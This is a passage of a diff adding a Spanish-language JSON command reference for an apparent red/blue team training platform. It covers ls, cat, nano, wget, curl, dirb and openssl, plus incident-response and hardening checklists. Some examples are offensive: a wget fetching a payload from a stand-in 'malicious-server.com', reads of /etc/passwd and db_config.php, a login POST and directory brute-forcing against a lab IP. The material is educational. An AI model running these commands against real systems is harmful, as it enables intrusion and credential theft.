+                "description": "Lista detallada incluyendo archivos ocultos"
+              },
+              {
+                "command": "ls -lh",
+                "description": "Lista con tamaños human-readable"
+              },
+              {
+                "command": "ls -lt",
+                "description": "Ordena por fecha de modificación"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-l", "description": "Formato largo (permisos, propietario, tamaño, fecha)" },
+              { "flag": "-a", "description": "Incluye archivos ocultos (empiezan con .)" },
+              { "flag": "-h", "description": "Tamaños human-readable (KB, MB, GB)" },
+              { "flag": "-t", "description": "Ordena por fecha de modificación" },
+              { "flag": "-r", "description": "Orden inverso" },
+              { "flag": "-R", "description": "Recursivo (subdirectorios)" }
+            ]
+          },
+          {
+            "name": "cat",
+            "fullName": "Concatenate",
+            "description": "Muestra el contenido de archivos.",
+            "syntax": "cat [opciones] [archivo]",
+            "category": "admin",
+            "team": "both",
+            "examples": [
+              {
+                "command": "cat /var/www/html/db_config.php",
+                "description": "Muestra contenido de archivo de configuración"
+              },
+              {
+                "command": "cat -n /etc/passwd",
+                "description": "Muestra con números de línea"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-n", "description": "Numera las líneas" },
+              { "flag": "-b", "description": "Numera solo líneas no vacías" },
+              { "flag": "-A", "description": "Muestra caracteres no imprimibles" }
+            ],
+            "securityNote": "⚠️ Verificar permisos antes de leer archivos sensibles. Archivos como db_config.php no deberían ser world-readable."
+          },
+          {
+            "name": "nano",
+            "fullName": "Nano's ANOther editor",
+            "description": "Editor de texto simple para terminal.",
+            "syntax": "nano [archivo]",
+            "category": "admin",
+            "team": "blue",
+            "examples": [
+              {
+                "command": "sudo nano /etc/ssh/sshd_config",
+                "description": "Edita configuración SSH"
+              },
+              {
+                "command": "nano /var/www/html/index.php",
+                "description": "Edita archivo web"
+              }
+            ],
+            "keyboardShortcuts": [
+              { "keys": "Ctrl+O", "action": "Guardar (Write Out)" },
+              { "keys": "Ctrl+X", "action": "Salir" },
+              { "keys": "Ctrl+K", "action": "Cortar línea" },
+              { "keys": "Ctrl+U", "action": "Pegar" },
+              { "keys": "Ctrl+W", "action": "Buscar" },
+              { "keys": "Ctrl+\\", "action": "Buscar y reemplazar" }
+            ]
+          },
+          {
+            "name": "whoami",
+            "fullName": "Who Am I",
+            "description": "Muestra el nombre del usuario actual.",
+            "syntax": "whoami",
+            "category": "admin",
+            "team": "both",
+            "examples": [
+              {
+                "command": "whoami",
+                "description": "Verifica tu usuario actual"
+              }
+            ],
+            "useCases": [
+              "Verificar usuario después de SSH",
+              "Confirmar privilegios antes de comandos sudo",
+              "Scripts que necesitan saber el usuario actual"
+            ]
+          },
+          {
+            "name": "wget",
+            "fullName": "Web Get",
+            "description": "Descarga archivos desde la web.",
+            "syntax": "wget [opciones] [URL]",
+            "category": "admin",
+            "team": "red",
+            "examples": [
+              {
+                "command": "wget http://malicious-server.com/payload.sh",
+                "description": "Descarga un payload (simulado)"
+              },
+              {
+                "command": "wget -O /tmp/exploit.py https://example.com/exploit.py",
+                "description": "Descarga con nombre personalizado"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-O", "description": "Nombre de archivo de salida" },
+              { "flag": "-q", "description": "Modo silencioso" },
+              { "flag": "-c", "description": "Continúa descarga interrumpida" },
+              { "flag": "--no-check-certificate", "description": "Ignora errores de certificado SSL" }
+            ],
+            "securityNote": "🚨 En pentesting, wget se usa para descargar payloads y herramientas. En defensa, monitorear descargas sospechosas."
+          }
+        ]
+      },
+      {
+        "id": "web-testing",
+        "name": "Pruebas de Aplicaciones Web",
+        "icon": "globe",
+        "color": "bg-orange-600",
+        "description": "Herramientas para auditoría y pentesting de aplicaciones web",
+        "commands": [
+          {
+            "name": "curl",
+            "fullName": "Client URL",
+            "description": "Herramienta de línea de comandos para transferir datos con URLs. Útil para pruebas de APIs y web.",
+            "syntax": "curl [opciones] [URL]",
+            "category": "web",
+            "team": "both",
+            "examples": [
+              {
+                "command": "curl http://10.0.10.5",
+                "description": "GET básico de una página"
+              },
+              {
+                "command": "curl http://10.0.10.5/db_config.php",
+                "description": "Intenta leer archivo sensible"
+              },
+              {
+                "command": "curl -X POST -d 'user=admin&pass=123' http://10.0.10.5/login.php",
+                "description": "POST para formulario de login"
+              },
+              {
+                "command": "curl -H 'User-Agent: Mozilla/5.0' http://10.0.10.5",
+                "description": "GET con header personalizado"
+              },
+              {
+                "command": "curl -I http://10.0.10.5",
+                "description": "Solo headers (HEAD request)"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-X", "description": "Método HTTP (GET, POST, PUT, DELETE)" },
+              { "flag": "-d", "description": "Datos POST" },
+              { "flag": "-H", "description": "Header personalizado" },
+              { "flag": "-I", "description": "Solo muestra headers" },
+              { "flag": "-i", "description": "Incluye headers en la salida" },
+              { "flag": "-k", "description": "Ignora errores de certificado SSL" },
+              { "flag": "-L", "description": "Sigue redirects" },
+              { "flag": "-o", "description": "Guarda salida en archivo" }
+            ],
+            "useCases": [
+              "Probar APIs REST",
+              "Fuzzing de parámetros web",
+              "Exfiltración de datos",
+              "Verificar headers de seguridad",
+              "Pruebas de inyección"
+            ]
+          },
+          {
+            "name": "dirb",
+            "fullName": "Directory Buster",
+            "description": "Escáner de directorios y archivos web mediante fuerza bruta con wordlists.",
+            "syntax": "dirb [URL] [wordlist]",
+            "category": "web",
+            "team": "red",
+            "examples": [
+              {
+                "command": "dirb http://10.0.10.5",
+                "description": "Escaneo con wordlist por defecto"
+              },
+              {
+                "command": "dirb http://10.0.10.5 /usr/share/wordlists/dirb/common.txt",
+                "description": "Escaneo con wordlist específica"
+              },
+              {
+                "command": "dirb http://10.0.10.5 -X .php,.txt",
+                "description": "Busca solo archivos PHP y TXT"
+              }
+            ],
+            "commonFlags": [
+              { "flag": "-X", "description": "Extensiones a buscar" },
+              { "flag": "-w", "description": "No detener en WARNING" },
+              { "flag": "-r", "description": "No hacer búsqueda recursiva" }
+            ],
+            "useCases": [
+              "Descubrir archivos de backup (.bak, .old)",
+              "Encontrar paneles de administración",
+              "Localizar archivos sensibles (db_config, phpinfo)",
+              "Mapear estructura de directorios"
+            ],
+            "commonFinds": [
+              "/admin/ - Panel de administración",
+              "/backup/ - Backups del sitio",
+              "/config/ - Archivos de configuración",
+              "/.git/ - Repositorio Git expuesto",
+              "/db_config.php - Credenciales de base de datos",
+              "/phpinfo.php - Información del sistema"
+            ]
+          },
+          {
+            "name": "openssl",
+            "fullName": "OpenSSL",
+            "description": "Toolkit criptográfico. Útil para pruebas de SSL/TLS y certificados.",
+            "syntax": "openssl [comando] [opciones]",
+            "category": "web",
+            "team": "both",
+            "examples": [
+              {
+                "command": "openssl s_client -connect 10.0.10.5:443",
+                "description": "Verifica certificado SSL y cifrados soportados"
+              },
+              {
+                "command": "openssl s_client -connect 10.0.10.5:443 -showcerts",
+                "description": "Muestra toda la cadena de certificados"
+              },
+              {
+                "command": "openssl s_client -connect 10.0.10.5:443 -cipher 'DES-CBC3-SHA'",
+                "description": "Prueba un cifrado específico (débil)"
+              }
+            ],
+            "useCases": [
+              "Auditar configuración SSL/TLS",
+              "Detectar cifrados débiles",
+              "Verificar vencimiento de certificados",
+              "Probar vulnerabilidades como Heartbleed"
+            ],
+            "securityChecks": [
+              "✅ Verificar que solo TLS 1.2+ esté habilitado",
+              "✅ Deshabilitar cifrados débiles (DES, RC4, MD5)",
+              "✅ Certificado válido y no expirado",
+              "✅ Cadena de certificados completa",
+              "✅ No hay vulnerabilidades conocidas (Heartbleed, POODLE)"
+            ]
+          }
+        ]
+      }
+    ],
+    "quickReference": {
+      "emergencyCommands": {
+        "title": "Comandos de Emergencia (Respuesta a Incidentes)",
+        "commands": [
+          {
+            "scenario": "Ataque de Fuerza Bruta Detectado",
+            "steps": [
+              "1. journalctl -u sshd | grep 'Failed password' | tail -20",
+              "2. sudo ufw deny from [IP_ATACANTE]",
+              "3. fail2ban-client status sshd"
+            ]
+          },
+          {
+            "scenario": "Servidor Web Comprometido",
+            "steps": [
+              "1. sha256sum /var/www/html/*.php > /tmp/current_hashes.txt",
+              "2. diff /root/baseline_hashes.txt /tmp/current_hashes.txt",
+              "3. ps aux | grep www-data",
+              "4. ss -tulnp | grep :80"
+            ]
+          },
+          {
+            "scenario": "Ataque DoS en Progreso",
+            "steps": [
+              "1. top (verificar carga CPU)",
+              "2. ss -s (estadísticas de conexiones)",
+              "3. sudo ufw enable",
+              "4. sudo ufw limit ssh",
+              "5. Contactar ISP/CloudFlare para mitigación upstream"
+            ]
+          }
+        ]
+      },
+      "dailyMonitoring": {
+        "title": "Comandos de Monitoreo Diario (SOC)",
+        "commands": [
+          "sudo ufw status numbered - Verificar reglas de firewall",
+          "journalctl -p err --since today - Errores del día",
+          "journalctl -u sshd --since today | grep 'Accepted' - Logins SSH exitosos",
+          "ps aux --sort=-%mem | head - Top 10 procesos por memoria",
+          "ss -tulnp - Puertos escuchando",
+          "fail2ban-client status - Estado de fail2ban"
+        ]
+      },
+      "hardeningChecklist": {
+        "title": "Checklist de Hardening Post-Instalación",
+        "items": [
+          "✅ Actualizar sistema: apt update && apt upgrade",
+          "✅ Configurar firewall: sudo ufw enable",
+          "✅ Asegurar SSH: PermitRootLogin no, PasswordAuthentication no",
+          "✅ Instalar fail2ban: apt install fail2ban",
+          "✅ Permisos de archivos sensibles: chmod 640 /etc/shadow",
+          "✅ Deshabilitar servicios innecesarios",
+          "✅ Crear usuario no-root para administración",
+          "✅ Configurar logs centralizados"
+        ]
+      }
+    }
+  }
+};
